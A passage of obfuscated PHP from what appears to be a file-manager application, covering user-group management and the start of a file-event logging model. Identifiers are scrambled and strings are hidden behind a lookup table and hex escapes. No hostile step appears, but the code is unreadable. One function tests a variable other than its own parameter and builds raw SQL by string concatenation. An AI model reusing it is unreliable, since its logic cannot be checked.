Pinyin::get($Íç’ˆšø, $½ä¶–ûº[634])); $this->metaSet($õŒ¿©¡´, $òà—¬»); } protected function groupStatus($¶’©’, $°íô ³³) { $õÀæ¤Ôİ =& $_SERVER[ú‡®¯¨±]; $·äÄ®Õ = $this->getInfoSimple($¶’©’); if (!$·äÄ®Õ) { return !1; } if ($°íô ³³ == $õÀæ¤Ôİ[90]) { $¬¶¹ş¼ = $this->parentLevelArray($·äÄ®Õ[$õÀæ¤Ôİ[563]]); } else { $Î¿ÄŞÔ = array($õÀæ¤Ôİ[630] => array($õÀæ¤Ôİ[590], $·äÄ®Õ[$õÀæ¤Ôİ[563]] . $·äÄ®Õ[$õÀæ¤Ôİ[1906]] . $õÀæ¤Ôİ[591])); $¬¶¹ş¼ = $this->where($Î¿ÄŞÔ)->field($õÀæ¤Ôİ[1906])->select(); $¬¶¹ş¼ = array_to_keyvalue($¬¶¹ş¼, $õÀæ¤Ôİ[12], $õÀæ¤Ôİ[1906]); } $¬¶¹ş¼[] = $·äÄ®Õ[$õÀæ¤Ôİ[1906]]; $«øÈÎ = array(); foreach ($¬¶¹ş¼ as $¶’©’) { $«øÈÎ[] = array($õÀæ¤Ôİ[1906] => $¶’©’, $õÀæ¤Ôİ[96] => $õÀæ¤Ôİ[805], $õÀæ¤Ôİ[429] => $°íô ³³); $this->_clearCache($¶’©’); } return Model($õÀæ¤Ôİ[1995])->addAll($«øÈÎ, array(), !0); } protected function groupRemove($¬‹èäÈ, $«”¬µüª = false) { $–³ÜÌ‘Ô =& $_SERVER[ú‡®¯¨±]; $òî„•´ = array($–³ÜÌ‘Ô[1906] => $¬‹èäÈ); $§®®»›ƒ = $this->where($òî„•´)->find(); if (!$§®®»›ƒ || $§®®»›ƒ[$–³ÜÌ‘Ô[182]] == 0) { return !1; } if (!$«”¬µüª) { $•Ì‘Åì’ = $this->getInfoSimple($§®®»›ƒ[$–³ÜÌ‘Ô[182]]); $this->_changeChildLevel($§®®»›ƒ, $•Ì‘Åì’, !0); $this->where(array($–³ÜÌ‘Ô[182] => $¬‹èäÈ))->save(array($–³ÜÌ‘Ô[182] => $§®®»›ƒ[$–³ÜÌ‘Ô[182]])); $this->_clearCache($•Ì‘Åì’[$–³ÜÌ‘Ô[1906]]); } Model($–³ÜÌ‘Ô[1995])->where($òî„•´)->delete(); Model($–³ÜÌ‘Ô[1996])->where($òî„•´)->delete(); Model($–³ÜÌ‘Ô[880])->groupRootRemove($¬‹èäÈ); $this->_clearCache($§®®»›ƒ[$–³ÜÌ‘Ô[182]]); return $this->where($òî„•´)->delete(); } protected function groupSort($ŠÎí„åŸ) { $ª¿À±ğğ =& $_SERVER[ú‡®¯¨±]; $Ô”Ç…Ş§ = array(); foreach ($ŠÎí„åŸ as $òäˆÄÊÕ => $«ñÖä™—) { $Ô”Ç…Ş§[] = array($ª¿À±ğğ[1906], $«ñÖä™—, $ª¿À±ğğ[1930], $òäˆÄÊÕ + 1); } $this->saveAll($Ô”Ç…Ş§); } public function listData() { $¾‰£€Ô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¾‰£€Ô[$_SERVER[ú‡®¯¨±][424]]); return $¾‰£€Ô; } private function _makeOrder($¶¿ÃˆÍ = '') { $ğóïıôÎ =& $_SERVER[ú‡®¯¨±]; $ãåûµÀ = array($ğóïıôÎ[1906], $ğóïıôÎ[32], $ğóïıôÎ[1895], $ğóïıôÎ[227]); $î¸€°–ë = array($ğóïıôÎ[501] => $ğóïıôÎ[502], $ğóïıôÎ[503] => $ğóïıôÎ[504]); $ó§¬úŠÜ = Input::get($ğóïıôÎ[508], $ğóïıôÎ[7], $ğóïıôÎ[1910], $ãåûµÀ); $ü–±­¤° = Input::get($ğóïıôÎ[509], $ğóïıôÎ[7], $ğóïıôÎ[1997], array($ğóïıôÎ[1997], $ğóïıôÎ[503])); $ü–±­¤° = $î¸€°–ë[$ü–±­¤°]; $¶¿ÃˆÍ = $¶¿ÃˆÍ . "{$ó§¬úŠÜ}\40{$ü–±­¤°}\x2c\x20\147\x72\x6f\x75\x70\x49\104\x20\141\x73\143"; return $this->order($¶¿ÃˆÍ); } public function listChild($Ê¼ãÊ³) { $Á–µıØ =& $_SERVER[ú‡®¯¨±]; $áªäüà = $this->where(array($Á–µıØ[182] => $Ê¼ãÊ³))->_makeOrder()->selectPage(200); $this->_listDataApply($áªäüà[$Á–µıØ[424]]); return $áªäüà; } public function listChildIds($‹ºîÂëŠ) { $ŠĞÎåÒ‘ =& $_SERVER[ú‡®¯¨±]; if (is_string($İîûç•‹)) { $‹ºîÂëŠ = explode($ŠĞÎåÒ‘[50], $‹ºîÂëŠ); } $ş™İÜé = $this->where(array($ŠĞÎåÒ‘[1906] => array($ŠĞÎåÒ‘[7], $‹ºîÂëŠ)))->field($ŠĞÎåÒ‘[1998])->select(); if (!$ş™İÜé) { return !1; } $¡à¿³¥ƒ = array(); foreach ($ş™İÜé as $òõÇã¥­) { $¡à¿³¥ƒ[] = "\163\x65\154\145\143\x74\40\147\x72\x6f\165\160\x49\104\40\146\x72\157\x6d\x20\140\x67\162\157\x75\x70\x60\40\167\x68\145\162\145\40\160\x61\x72\145\156\x74\114\x65\166\145\x6c\x20\x6c\151\x6b\145\x20\47{$òõÇã¥­[$ŠĞÎåÒ‘[563]]}{$òõÇã¥­[$ŠĞÎåÒ‘[1906]]}\54\45\x27"; } $¡à¿³¥ƒ = implode($ŠĞÎåÒ‘[1999], $¡à¿³¥ƒ); $ş™İÜé = $this->query($¡à¿³¥ƒ); if (!$ş™İÜé) { return array(); } $‹ºîÂëŠ = array_to_keyvalue($ş™İÜé, $ŠĞÎåÒ‘[12], $ŠĞÎåÒ‘[1906]); return array_unique($‹ºîÂëŠ); } public function listByID($ÅŸ»£Ö) { $§¦âçÓŸ =& $_SERVER[ú‡®¯¨±]; if (!$ÅŸ»£Ö) { return array(); } $™ÌÛÂö = array($§¦âçÓŸ[1906] => array($§¦âçÓŸ[7], $ÅŸ»£Ö)); $½¤ÖÒ‡æ = $this->where($™ÌÛÂö)->select(); $½¤ÖÒ‡æ = array_sort_keep($½¤ÖÒ‡æ, $§¦âçÓŸ[1906], $ÅŸ»£Ö); $this->_listDataApply($½¤ÖÒ‡æ); return $½¤ÖÒ‡æ; } public function listSearch($Âùú°‰) { $ÄßÀ×°ö =& $_SERVER[ú‡®¯¨±]; $¤‹¬ò«ø = $Âùú°‰[$ÄßÀ×°ö[2000]]; $®æ¶¦ıú = isset($Âùú°‰[$ÄßÀ×°ö[2001]]) ? $Âùú°‰[$ÄßÀ×°ö[2001]] : !1; if (!trim($¤‹¬ò«ø)) { return !1; } $¤‹¬ò«ø = str_replace($ÄßÀ×°ö[2002], $ÄßÀ×°ö[2003], $¤‹¬ò«ø); $üØ„ïËÆ = array($ÄßÀ×°ö[1906] => array($ÄßÀ×°ö[437], "{$¤‹¬ò«ø}\x25"), $ÄßÀ×°ö[32] => array($ÄßÀ×°ö[437], "\x25{$¤‹¬ò«ø}\45"), $ÄßÀ×°ö[1056] => $ÄßÀ×°ö[2004]); if ($®æ¶¦ıú) { $½’Û”ìõ = $this->getInfoSimple($®æ¶¦ıú); $„îÀ˜ì = $½’Û”ìõ[$ÄßÀ×°ö[563]] . $®æ¶¦ıú . $ÄßÀ×°ö[591]; $üØ„ïËÆ = array($üØ„ïËÆ, array($ÄßÀ×°ö[563] => array($ÄßÀ×°ö[437], $„îÀ˜ì))); } $üØ„ïËÆ = $this->parseWhereLike($üØ„ïËÆ); $¶ÙÍ¿ß• = $this->_makeOrder()->where($üØ„ïËÆ)->selectPage(20); $¶ÙÍ¿ß• = $¶ÙÍ¿ß• ? $¶ÙÍ¿ß• : array($ÄßÀ×°ö[424] => array(), $ÄßÀ×°ö[421] => array()); if (!$¶ÙÍ¿ß• || count($¶ÙÍ¿ß•[$ÄßÀ×°ö[424]]) < 5 && Input::check($¤‹¬ò«ø, $ÄßÀ×°ö[373])) { $øƒ¥ˆ™ = $this->groupChildrenAll($®æ¶¦ıú); $ÊœãØš = $this->_searchFromMeta($ÄßÀ×°ö[515], $¤‹¬ò«ø, 10, $øƒ¥ˆ™); $‘ÎÕ³Ù = $this->_searchFromMeta($ÄßÀ×°ö[516], $¤‹¬ò«ø, 10, $øƒ¥ˆ™); $†½¦‚‘ä = array_merge($ÊœãØš, $‘ÎÕ³Ù, $¶ÙÍ¿ß•[$ÄßÀ×°ö[424]]); $¶ÙÍ¿ß•[$ÄßÀ×°ö[424]] = array_unique_by_key($†½¦‚‘ä, $ÄßÀ×°ö[1906]); $¶ÙÍ¿ß•[$ÄßÀ×°ö[421]][$ÄßÀ×°ö[422]] = count($¶ÙÍ¿ß•[$ÄßÀ×°ö[424]]); $¶ÙÍ¿ß•[$ÄßÀ×°ö[421]][$ÄßÀ×°ö[423]] = ceil($¶ÙÍ¿ß•[$ÄßÀ×°ö[421]][$ÄßÀ×°ö[422]] / $¶ÙÍ¿ß•[$ÄßÀ×°ö[421]][$ÄßÀ×°ö[418]]); } $this->_listDataApply($¶ÙÍ¿ß•[$ÄßÀ×°ö[424]]); return $¶ÙÍ¿ß•; } protected function groupChildrenAll($ª‘è½¦ı) { $™Ñ”½¾¨ =& $_SERVER[ú‡®¯¨±]; if (!$ª‘è½¦ı) { return !1; } if (!is_array($ª‘è½¦ı)) { $ª‘è½¦ı = array($ª‘è½¦ı); } $· ”ÛÜÅ = $ª‘è½¦ı; foreach ($ª‘è½¦ı as $Ôßâ¶µ°) { $²äéÔËË = $this->getInfoSimple($Ôßâ¶µ°); $™÷Á‰» = array($™Ñ”½¾¨[563] => array($™Ñ”½¾¨[437], $²äéÔËË[$™Ñ”½¾¨[563]] . $Ôßâ¶µ° . $™Ñ”½¾¨[591])); $«ã³ Û¤ = $this->field($™Ñ”½¾¨[1906])->where($™÷Á‰»)->select(); $· ”ÛÜÅ = array_merge($· ”ÛÜÅ, array_to_keyvalue($«ã³ Û¤, $™Ñ”½¾¨[12], $™Ñ”½¾¨[1906])); } return array_unique($· ”ÛÜÅ); } private function _searchFromMeta($Êã¤ß, $ªñé³, $šüõÖçË, $ÔÓ“ªõì) { $¡àÇ£éœ =& $_SERVER[ú‡®¯¨±]; $ªñé³ = strtolower($ªñé³); $ß†úıòË = array($¡àÇ£éœ[96] => $Êã¤ß, $¡àÇ£éœ[429] => array($¡àÇ£éœ[437], "\x25{$ªñé³}\x25")); $ß†úıòË = $this->parseWhereLike($ß†úıòË); if ($ÔÓ“ªõì) { $ß†úıòË[$¡àÇ£éœ[1906]] = array($¡àÇ£éœ[7], $ÔÓ“ªõì); } $µíò¡¢Ÿ = Model($¡àÇ£éœ[2005])->where($ß†úıòË)->limit($šüõÖçË)->select(); if (!$µíò¡¢Ÿ) { return array(); } $µíò¡¢Ÿ = array_to_keyvalue($µíò¡¢Ÿ, $¡àÇ£éœ[12], $¡àÇ£éœ[1906]); $•î­¢ÆÅ = $this->where(array($¡àÇ£éœ[1994] => array($¡àÇ£éœ[7], $µíò¡¢Ÿ)))->select(); if (!$•î­¢ÆÅ) { return array(); } return $•î­¢ÆÅ; } protected function _listDataApplyItem($åéÑ–„˜) { $ÀåõË¿¬ = array($åéÑ–„˜); $this->_listDataApply($ÀåõË¿¬); return $ÀåõË¿¬[0]; } protected function _listDataApply(&$•°İ»¨£) { $¼ ú÷ìÁ =& $_SERVER[ú‡®¯¨±]; if (!$•°İ»¨£) { return; } $ˆ®á€ˆ¤ = array_to_keyvalue($•°İ»¨£, $¼ ú÷ìÁ[12], $¼ ú÷ìÁ[1906]); $this->_listAppendChildren($•°İ»¨£); $this->_listAppendChildrenMember($•°İ»¨£); $this->_listAppendMeta($•°İ»¨£, $ˆ®á€ˆ¤); $this->_listAppendParent($•°İ»¨£); $this->_listAppendSourceRoot($•°İ»¨£, $ˆ®á€ˆ¤); } private function _listAppendChildren(&$ƒª¥ôÇ‹) { $äÊæ =& $_SERVER[ú‡®¯¨±]; $«şÑ™±É = array_to_keyvalue($ƒª¥ôÇ‹, $äÊæ[12], $äÊæ[1906]); $¦üËêı× = array($äÊæ[182] => array($äÊæ[7], $«şÑ™±É)); $Åôù˜«ß = array($äÊæ[182], $äÊæ[2006] => $äÊæ[544]); $Œ‡ŒÆ…ò = $this->field($Åôù˜«ß)->where($¦üËêı×)->group($äÊæ[182])->select(); $êßäšÄø = array_to_keyvalue($Œ‡ŒÆ…ò, $äÊæ[182], $äÊæ[544]); foreach ($ƒª¥ôÇ‹ as &$º›®·›¸) { $Õ‘Â˜¡ = $º›®·›¸[$äÊæ[1906]]; $º›®·›¸[$äÊæ[2007]] = isset($êßäšÄø[$Õ‘Â˜¡]) ? intval($êßäšÄø[$Õ‘Â˜¡]) : !1; } unset($º›®·›¸); } private function _listAppendChildrenMember(&$Ä§®á€–) { $÷öÛš÷Ã =& $_SERVER[ú‡®¯¨±]; $Ú¥¡¨êˆ = array_to_keyvalue($Ä§®á€–, $÷öÛš÷Ã[12], $÷öÛš÷Ã[1906]); $šíˆæ½ = array($÷öÛš÷Ã[1906] => array($÷öÛš÷Ã[7], $Ú¥¡¨êˆ)); $İññ¶™ = array($÷öÛš÷Ã[1906], $÷öÛš÷Ã[2006] => $÷öÛš÷Ã[544]); $¼Ä“Ö = Model($÷öÛš÷Ã[1996])->field($İññ¶™)->where($šíˆæ½)->group($÷öÛš÷Ã[1906])->select(); $é®Ÿˆ‰á = array_to_keyvalue($¼Ä“Ö, $÷öÛš÷Ã[1906], $÷öÛš÷Ã[544]); foreach ($Ä§®á€– as &$ó‘¤ÌŠ‚) { $­Çô¹“½ = $ó‘¤ÌŠ‚[$÷öÛš÷Ã[1906]]; $ó‘¤ÌŠ‚[$÷öÛš÷Ã[2008]] = isset($é®Ÿˆ‰á[$­Çô¹“½]) ? intval($é®Ÿˆ‰á[$­Çô¹“½]) : !1; } unset($ó‘¤ÌŠ‚); } private function _listAppendMeta(&$¦²’šì, $¶ĞàºÂö) { $Ìª×²“Ô =& $_SERVER[ú‡®¯¨±]; $«ŠõˆƒÎ = array($Ìª×²“Ô[1906] => array($Ìª×²“Ô[7], $¶ĞàºÂö)); $£ûñ¸ó = Model($Ìª×²“Ô[1995])->where($«ŠõˆƒÎ)->select(); $£ûñ¸ó = array_to_keyvalue_group($£ûñ¸ó, $Ìª×²“Ô[1906]); foreach ($£ûñ¸ó as &$µ¬àêí) { $µ¬àêí = array_to_keyvalue($µ¬àêí, $Ìª×²“Ô[96], $Ìª×²“Ô[429]); } unset($µ¬àêí); foreach ($¦²’šì as &$’äİ““) { $’äİ““[$Ìª×²“Ô[517]] = array(); if (isset($£ûñ¸ó[$’äİ““[$Ìª×²“Ô[1906]]])) { $’äİ““[$Ìª×²“Ô[517]] = $£ûñ¸ó[$’äİ““[$Ìª×²“Ô[1906]]]; } } unset($’äİ““); } protected function parentLevelArray($òí…è¬¤) { $ÔõÄ½ =& $_SERVER[ú‡®¯¨±]; $òí…è¬¤ = explode($ÔõÄ½[50], trim($òí…è¬¤, $ÔõÄ½[50])); $òí…è¬¤ = array_remove_value($òí…è¬¤, $ÔõÄ½[224]); return $òí…è¬¤; } protected function parentInGroup($Š÷É»á, $ÏÌ§¯äİ) { $Ãˆ¦”° =& $_SERVER[ú‡®¯¨±]; $ûÉ˜åı° = $this->getInfoSimple($Š÷É»á); if (!$ûÉ˜åı°) { return !0; } $ˆÓŒı“œ = $this->parentLevelArray($ûÉ˜åı°[$Ãˆ¦”°[563]]); $ˆÓŒı“œ[] = $Š÷É»á; foreach ($ˆÓŒı“œ as $Š÷É»á) { if (in_array($Š÷É»á . $Ãˆ¦”°[12], $ÏÌ§¯äİ)) { return !0; } } return !1; } private function _listAppendParent(&$Ë§×âÌœ) { $»½¼„¸¨ =& $_SERVER[ú‡®¯¨±]; $Ê¾’ŞÚ = array(); foreach ($Ë§×âÌœ as &$µöÈÊæ) { $Ê¾’ŞÚ[$µöÈÊæ[$»½¼„¸¨[1906]]] = $µöÈÊæ[$»½¼„¸¨[32]]; $‰°ûİô£ = $this->parentLevelArray($µöÈÊæ[$»½¼„¸¨[563]]); foreach ($‰°ûİô£ as $Û‹˜¢¹è) { if (!isset($Ê¾’ŞÚ[$Û‹˜¢¹è])) { $Ê¾’ŞÚ[$Û‹˜¢¹è] = 0; } } } unset($µöÈÊæ); foreach ($Ê¾’ŞÚ as $ƒõªõù¡ => $—ã÷¶Éš) { if ($—ã÷¶Éš) { continue; } $ú¸»ğÏÀ = $this->getInfoSimple($ƒõªõù¡); $Ê¾’ŞÚ[$ƒõªõù¡] = $ú¸»ğÏÀ[$»½¼„¸¨[32]]; } $Àâ÷¦ø¿ = $GLOBALS[$»½¼„¸¨[6]][$»½¼„¸¨[91]][$»½¼„¸¨[2009]]; if (KodUser::isRoot()) { $Àâ÷¦ø¿ = !1; } foreach ($Ë§×âÌœ as &$µöÈÊæ) { $‰°ûİô£ = $this->parentLevelArray($µöÈÊæ[$»½¼„¸¨[563]]); $ÂâÄï = $»½¼„¸¨[12]; foreach ($‰°ûİô£ as $ƒõªõù¡ => $Û‹˜¢¹è) { if ($Àâ÷¦ø¿ && $ƒõªõù¡ == 0) { continue; } $ÂâÄï .= $Ê¾’ŞÚ[$Û‹˜¢¹è] . $»½¼„¸¨[8]; } if ($‰°ûİô£) { $ÂâÄï .= $µöÈÊæ[$»½¼„¸¨[32]]; } $µöÈÊæ[$»½¼„¸¨[568]] = str_replace($»½¼„¸¨[571], $»½¼„¸¨[8], $ÂâÄï); } unset($µöÈÊæ); } private function _listAppendSourceRoot(&$ß¡Ú±¸ã, $„şñ·ı·) { $¶ÌÉèÔı =& $_SERVER[ú‡®¯¨±]; $˜ˆÒ…¯í = Model($¶ÌÉèÔı[880])->listSourceRoot(SourceModel::TYPE_GROUP, $„şñ·ı·); $˜ˆÒ…¯í = array_to_keyvalue($˜ˆÒ…¯í, $¶ÌÉèÔı[548]); $˜ˆÒ…¯í = array_remove_key($˜ˆÒ…¯í, $¶ÌÉèÔı[548]); foreach ($ß¡Ú±¸ã as &$À–î†«ó) { $À–î†«ó[$¶ÌÉèÔı[89]] = $˜ˆÒ…¯í[$À–î†«ó[$¶ÌÉèÔı[1906]]] ? $˜ˆÒ…¯í[$À–î†«ó[$¶ÌÉèÔı[1906]]] : array(); } unset($À–î†«ó); } protected function groupMerge($ŠÛäò´¢) { $ŠÛäò´¢ = array_values(array_unique($ŠÛäò´¢)); $ÙÃ¬æ¶… = array(); for ($Ï‹£Öµ = 0; $Ï‹£Öµ < count($ŠÛäò´¢); $Ï‹£Öµ++) { $Œ—Ù¯ü„ = !1; for ($Áëìº¢ = 0; $Áëìº¢ < count($ŠÛäò´¢); $Áëìº¢++) { if ($Ï‹£Öµ == $Áëìº¢) { continue; } if ($this->isParentOf($ŠÛäò´¢[$Áëìº¢], $ŠÛäò´¢[$Ï‹£Öµ])) { $Œ—Ù¯ü„ = !0; break; } } if (!$Œ—Ù¯ü„) { $ÙÃ¬æ¶…[] = $ŠÛäò´¢[$Ï‹£Öµ]; } } return $ÙÃ¬æ¶…; } protected function isParentOf($êî¯›Öœ, $ã„µƒäÎ) { $Æ’°Ú‡½ =& $_SERVER[ú‡®¯¨±]; if (!$êî¯›Öœ || !$ã„µƒäÎ || $êî¯›Öœ == $ã„µƒäÎ) { return !1; } $¨øÄ±ø¶ = $this->getInfoSimple($êî¯›Öœ); $¦Áì­Õµ = $this->getInfoSimple($ã„µƒäÎ); $ãò”§Ì„ = $¨øÄ±ø¶[$Æ’°Ú‡½[563]] . $êî¯›Öœ . $Æ’°Ú‡½[50]; if (substr($¦Áì­Õµ[$Æ’°Ú‡½[563]], 0, strlen($ãò”§Ì„)) == $ãò”§Ì„) { return !0; } return !1; } public function groupShowRoot($é€ŠŸåù, $™œ®ÁïÀ = false) { $æûôµ‘Ò =& $_SERVER[ú‡®¯¨±]; $ËÁ“¹‹š = $this->getInfo($é€ŠŸåù); if (!$ËÁ“¹‹š) { return array(); } $İ†¬‘ = $this->parentLevelArray($ËÁ“¹‹š[$æûôµ‘Ò[563]]); $¬è˜ Ñ = array($é€ŠŸåù); if (count($İ†¬‘) == 0) { return $¬è˜ Ñ; } if ($™œ®ÁïÀ && count($İ†¬‘) == 1) { return $¬è˜ Ñ; } if (!$ËÁ“¹‹š[$æûôµ‘Ò[517]] || !isset($ËÁ“¹‹š[$æûôµ‘Ò[517]][$æûôµ‘Ò[1992]]) || $ËÁ“¹‹š[$æûôµ‘Ò[517]][$æûôµ‘Ò[1992]] == $æûôµ‘Ò[1961]) { return $this->groupShowRoot($İ†¬‘[count($İ†¬‘) - 1], $™œ®ÁïÀ); } if ($ËÁ“¹‹š[$æûôµ‘Ò[517]][$æûôµ‘Ò[1992]] == $æûôµ‘Ò[412]) { $‡ÂıÁÂƒ = explode($æûôµ‘Ò[50], $ËÁ“¹‹š[$æûôµ‘Ò[517]][$æûôµ‘Ò[1993]]); if ($‡ÂıÁÂƒ) { $¬è˜ Ñ = array_merge($¬è˜ Ñ, $‡ÂıÁÂƒ); } } return $¬è˜ Ñ; } protected function resetParentLevel() { $ßÕÈùÑ¥ =& $_SERVER[ú‡®¯¨±]; $¤¡ë„çë = $ßÕÈùÑ¥[1906]; $Ç¶ç¦˜î = $this->select(); $Ç¶ç¦˜î = array_to_keyvalue($Ç¶ç¦˜î, $¤¡ë„çë); foreach ($Ç¶ç¦˜î as $º•åûÅÑ) { $ëÉ¤ØÜ = $º•åûÅÑ; $àğÍÕØˆ = array(); while ($ëÉ¤ØÜ[$ßÕÈùÑ¥[182]] != 0) { $àğÍÕØˆ[] = $ëÉ¤ØÜ[$ßÕÈùÑ¥[182]]; $ëÉ¤ØÜ = $Ç¶ç¦˜î[$ëÉ¤ØÜ[$ßÕÈùÑ¥[182]]]; } $àğÍÕØˆ[] = 0; $àğÍÕØˆ = $ßÕÈùÑ¥[50] . implode($ßÕÈùÑ¥[50], array_reverse($àğÍÕØˆ)) . $ßÕÈùÑ¥[50]; $this->setNamePinyin($º•åûÅÑ[$¤¡ë„çë], $º•åûÅÑ[$ßÕÈùÑ¥[32]]); $this->where(array($¤¡ë„çë => $º•åûÅÑ[$¤¡ë„çë]))->save(array($ßÕÈùÑ¥[630] => $àğÍÕØˆ)); } return $Ç¶ç¦˜î; } public function groupNameAuto($£¼£üá·, $ØñÒ›…‰) { $Ò ÜÊÌ† =& $_SERVER[ú‡®¯¨±]; $ô£üÔûõ = $this->where(array($Ò ÜÊÌ†[455] => $£¼£üá·))->getField($Ò ÜÊÌ†[32], !0); if (!$ô£üÔûõ || !in_array($ØñÒ›…‰, $ô£üÔûõ)) { return $ØñÒ›…‰; } for ($ÙäŒáÑç = 1; $ÙäŒáÑç <= count($ô£üÔûõ) + 1; $ÙäŒáÑç++) { $÷£¹·§ = $ØñÒ›…‰ . "\x28{$ÙäŒáÑç}\x29"; if (!in_array($÷£¹·§, $ô£üÔûõ)) { return $÷£¹·§; } } } public function groupSwitch($¤é¿Ê²–, $»¥õ¹§) { $ø²è „ö =& $_SERVER[ú‡®¯¨±]; $äÜä­•” = array($ø²è „ö[1906] => array($ø²è „ö[7], array($¤é¿Ê²–, $»¥õ¹§))); $İèÒ ê¶ = $this->where($äÜä­•”)->select(); $İèÒ ê¶ = array_to_keyvalue($İèÒ ê¶, $ø²è „ö[1906]); if (!isset($İèÒ ê¶[$¤é¿Ê²–]) || !isset($İèÒ ê¶[$»¥õ¹§]) || $İèÒ ê¶[$¤é¿Ê²–][$ø²è „ö[182]] == 0) { return !1; } $äÜä­•” = array($ø²è „ö[1906] => $¤é¿Ê²–); $…Í»öÏ£ = Model($ø²è „ö[1996])->where($äÜä­•”)->select(); if (!$…Í»öÏ£) { $…Í»öÏ£ = array(); } foreach ($…Í»öÏ£ as $È¦¾âÕï) { $¬°ğø  = $È¦¾âÕï[$ø²è „ö[1708]]; $äÜä­•” = array($ø²è „ö[1708] => $¬°ğø , $ø²è „ö[1906] => $»¥õ¹§); $°­¥Ò = Model($ø²è „ö[1996])->where($äÜä­•”)->find(); if (!$°­¥Ò) { $ƒåÖİâˆ = array($»¥õ¹§ => $È¦¾âÕï[$ø²è „ö[2010]]); Model($ø²è „ö[577])->userGroupAdd($¬°ğø , $ƒåÖİâˆ); } Model($ø²è „ö[577])->userGroupRemove($¬°ğø , $¤é¿Ê²–); } $äÜä­•” = array($ø²è „ö[180] => 2, $ø²è „ö[182] => 0, $ø²è „ö[463] => 1, $ø²è „ö[548] => array($ø²è „ö[7], array($¤é¿Ê²–, $»¥õ¹§))); $ÁÔîÇß = Model($ø²è „ö[880])->where($äÜä­•”)->field($ø²è „ö[2011])->select(); $ÁÔîÇß = array_to_keyvalue($ÁÔîÇß, $ø²è „ö[548], $ø²è „ö[183]); $³°¾Š‰² = !empty($ÁÔîÇß[$¤é¿Ê²–]) ? $ÁÔîÇß[$¤é¿Ê²–] : !1; if ($³°¾Š‰²) { if (!$ÁÔîÇß[$»¥õ¹§]) { $ÁÔîÇß[$»¥õ¹§] = Model($ø²è „ö[880])->groupRootAdd($»¥õ¹§); } $¥ª°¯‡Ä = $ÁÔîÇß[$»¥õ¹§]; $äÜä­•” = array($ø²è „ö[182] => $³°¾Š‰²); $ÁÔîÇß = Model($ø²è „ö[880])->where($äÜä­•”)->field($ø²è „ö[2012])->select(); if (!$ÁÔîÇß) { $ÁÔîÇß = array(); } Model($ø²è „ö[880])->moveClearAuth = !1; foreach ($ÁÔîÇß as $ÔŒ‹¡ï©) { $Ø¬í©ğ = $ÔŒ‹¡ï©[$ø²è „ö[463]] == $ø²è „ö[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ø²è „ö[880])->move($ÔŒ‹¡ï©[$ø²è „ö[183]], $¥ª°¯‡Ä, $Ø¬í©ğ); } Model($ø²è „ö[880])->moveClearAuth = !0; $äÜä­•” = array($ø²è „ö[180] => 2, $ø²è „ö[548] => $¤é¿Ê²–); $ÁÈ¦ Æ² = array($ø²è „ö[548] => $»¥õ¹§); Model($ø²è „ö[2013])->where($äÜä­•”)->save($ÁÈ¦ Æ²); Model($ø²è „ö[2014])->where($äÜä­•”)->save($ÁÈ¦ Æ²); } $this->_changeChildLevel($İèÒ ê¶[$¤é¿Ê²–], $İèÒ ê¶[$»¥õ¹§], !0); $this->where(array($ø²è „ö[182] => $¤é¿Ê²–))->save(array($ø²è „ö[182] => $»¥õ¹§)); $this->_clearChildrenCache($İèÒ ê¶[$»¥õ¹§]); return !0; } } goto báÔÍ®òä; AØ›ï•Ù’½: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\x65\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\151\155\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74", "\x66\x75\156\143\164\151\157\156"), array("\x64\x65\x73\x63", '', "\x69\156\x73\x65\162\164\x2c\x75\x70\x64\x61\x74\x65\54\x73\145\x6c\145\x63\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÚÁù›ø¨, $é“Å­‘Ş, $úÙ”Š‘ç = '') { $ÁÕ×¯Ö§ =& $_SERVER[ú‡®¯¨±]; if (!$this->eventSave) { return; } $ıŒÎ”¿Ì = Model($ÁÕ×¯Ö§[1389])->sourceInfo($ÚÁù›ø¨); if (!$ıŒÎ”¿Ì) { return !1; } if ($this->isCacheEvent($ıŒÎ”¿Ì, $é“Å­‘Ş)) { return; } if ($úÙ”Š‘ç && is_string($úÙ”Š‘ç)) { $úÙ”Š‘ç = array($ÁÕ×¯Ö§[1945] => $úÙ”Š‘ç); } $ìòÖ¼–¸ = defined($ÁÕ×¯Ö§[2129]) ? USER_ID : 0; $½’Ó‰¹ = array($ÁÕ×¯Ö§[469] => $ÚÁù›ø¨, $ÁÕ×¯Ö§[2130] => $ıŒÎ”¿Ì[$ÁÕ×¯Ö§[182]], $ÁÕ×¯Ö§[2131] => $ıŒÎ”¿Ì[$ÁÕ×¯Ö§[32]], $ÁÕ×¯Ö§[561] => !empty($ıŒÎ”¿Ì[$ÁÕ×¯Ö§[561]]) ? $ıŒÎ”¿Ì[$ÁÕ×¯Ö§[561]] : $ÁÕ×¯Ö§[12], $ÁÕ×¯Ö§[1699] => $ìòÖ¼–¸, $ÁÕ×¯Ö§[474] => $é“Å­‘Ş, $ÁÕ×¯Ö§[1701] => $úÙ”Š‘ç); $this->addSystemLog($é“Å­‘Ş, $½’Ó‰¹); unset($½’Ó‰¹[$ÁÕ×¯Ö§[2131]], $½’Ó‰¹[$ÁÕ×¯Ö§[561]]); return $this->add($½’Ó‰¹); } private function addSystemLog($·—âÜ‰, $æŒèÇû) { $Ó˜ÁøÛ =& $_SERVER[ú‡®¯¨±]; if ($·—âÜ‰ == $Ó˜ÁøÛ[2132]) { $·—âÜ‰ = $æŒèÇû[$Ó˜ÁøÛ[504]][$Ó˜ÁøÛ[2133]]; } else { if (in_array($·—âÜ‰, array($Ó˜ÁøÛ[1886], $Ó˜ÁøÛ[2134]))) { $·—âÜ‰ = $æŒèÇû[$Ó˜ÁøÛ[504]][$Ó˜ÁøÛ[809]]; } } $§¯«Î« = array_merge($æŒèÇû, array($Ó˜ÁøÛ[2135] => $æŒèÇû[$Ó˜ÁøÛ[183]], $Ó˜ÁøÛ[2136] => $æŒèÇû[$Ó˜ÁøÛ[2136]])); Hook::trigger($Ó˜ÁøÛ[2137], $Ó˜ÁøÛ[2138] . $·—âÜ‰, $æŒèÇû); Model($Ó˜ÁøÛ[1850])->addLog($Ó˜ÁøÛ[2138] . $·—âÜ‰, $§¯«Î«); } private function isCacheEvent($¹Ùç€âô, 